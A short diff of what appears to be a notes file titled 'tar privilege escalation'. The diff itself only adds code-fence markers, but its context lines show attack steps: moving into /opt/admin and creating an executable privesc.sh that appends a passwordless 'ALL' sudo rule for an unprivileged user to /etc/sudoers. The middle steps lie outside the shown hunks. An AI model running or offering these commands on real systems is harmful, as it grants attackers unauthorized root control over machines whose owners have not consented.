@@ -1,7 +1,7 @@
 
 
 === tar privilege escalation ==
-
+```
 Step 1: Go to /opt/admin
 
 cd /opt/admin
@@ -20,3 +20,4 @@ Step 3: Create a root privilege escalation script
 
 echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > privesc.sh
 chmod +x privesc.sh
+```
